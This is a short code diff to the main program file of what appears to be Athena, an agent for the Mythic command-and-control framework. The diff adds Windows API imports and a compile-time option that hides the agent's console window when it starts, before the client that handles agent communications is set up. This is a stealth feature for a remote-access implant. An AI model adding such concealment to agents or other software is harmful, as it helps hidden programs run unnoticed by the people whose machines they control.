@@ -1,6 +1,7 @@
 ﻿using Athena.Commands;
 using Athena.Utilities;
 using System.Collections.Generic;
+using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
 using System;
@@ -11,8 +12,17 @@ using Athena.Models.Mythic.Response;
 
 namespace Athena
 {
+
     class Program
     {
+#if FORCE_HIDE_WINDOW
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+#endif
+
         /// <summary>
         /// Main loop
         /// </summary>
@@ -21,6 +31,11 @@ namespace Athena
             int maxMissedCheckins = 100;
             int missedCheckins = 0;
             bool exit = false;
+
+#if FORCE_HIDE_WINDOW
+            //Hide Console Window
+            ShowWindow(GetConsoleWindow(), 0);
+#endif
 
             //MythicClient controls all of the agent communications
             Globals.mc = new MythicClient();
